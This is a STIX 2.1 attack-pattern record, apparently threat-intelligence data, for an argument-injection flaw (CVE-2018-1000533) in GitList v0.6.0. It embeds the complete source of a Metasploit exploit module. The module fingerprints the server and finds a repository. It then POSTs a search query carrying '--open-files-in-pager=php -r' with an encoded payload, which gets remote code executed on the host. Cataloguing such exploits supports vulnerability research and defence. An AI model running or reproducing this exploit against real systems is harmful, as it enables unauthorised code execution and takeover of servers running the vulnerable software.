{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5afe5bf3-3cf8-4f92-9c2d-0e406e782636",
    "created": "2024-08-14T17:10:32.961539Z",
    "modified": "2024-08-14T17:10:32.961543Z",
    "name": "\"GitList v0.6.0 Argument Injection Vulnerability\"",
    "description": " This module exploits an argument injection vulnerability in GitList v0.6.0. The vulnerability arises from GitList improperly validating input using the php function 'escapeshellarg'.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gitlist_arg_injection.rb",
            "external_id": "gitlist_arg_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1000533"
        },
        {
            "source_name": "reference",
            "url": "https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"GitList v0.6.0 Argument Injection Vulnerability\",\n      'Description'    => %q{\n        This module exploits an argument injection vulnerability in GitList v0.6.0.\n        The vulnerability arises from GitList improperly validating input using the php function\n        'escapeshellarg'.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Kacper Szurek', # EDB POC\n          'Shelby Pace'    # Metasploit Module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2018-1000533' ],\n          [ 'EDB', '44548' ],\n          [ 'URL', 'https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html']\n        ],\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'GitList v0.6.0', { } ]\n        ],\n      'Privileged'     => false,\n      'Payload'        => { 'BadChars' => '\\'' },\n      'DisclosureDate' => '2018-04-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n    [\n      OptString.new('TARGETURI', [true, 'Default path to GitList', '/'])\n    ])\n\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    res = send_request_cgi(\n      'method'  => 'GET',\n      'uri'     => uri\n    )\n\n    if res && res.code == 200 && /Powered by .*GitList 0\\.6\\.0/.match(res.body)\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_repo\n    repo_res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path)\n    )\n\n    if repo_res && repo_res.code == 200\n      repos = repo_res.body.scan(/\\/([^\\/]+)\\/master\\/rss\\//).flatten\n      fail_with(Failure::Unreachable, \"Could not retrieve any repos\") if repos.empty?\n      return repos.detect{ |r| r if has_files?(r) }\n    else\n      fail_with(Failure::Unreachable, \"Could not access GitList\")\n    end\n  end\n\n  def has_files?(repo)\n    res = send_request_cgi(\n    'method' => 'GET',\n    'uri'    => normalize_uri(target_uri.path, repo, '/')\n    )\n    if res && res.code == 200\n     print_good(\"Successfully accessed repo #{repo}\")\n     return false if res.body.scan(/#{repo}\\/blob\\/master\\//).flatten.empty?\n\n     return true\n    else\n      fail_with(Failure::Unreachable, \"Couldn't detect files in #{repo}'s repo\")\n    end\n  end\n\n  def exploit\n    repo = get_repo\n    fail_with(Failure::Unreachable, \"No files found in repos\") if repo.nil?\n\n    postUri = normalize_uri(target_uri.path, repo << '/tree/c/search')\n    cmd = \"--open-files-in-pager=php -r '#{payload.encoded}'\"\n    send_request_cgi(\n      'method' => 'POST',\n      'uri'    => postUri,\n      'vars_post' => { 'query' => cmd }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-26",
    "x_mitre_platforms": [
        "['php']"
    ]
}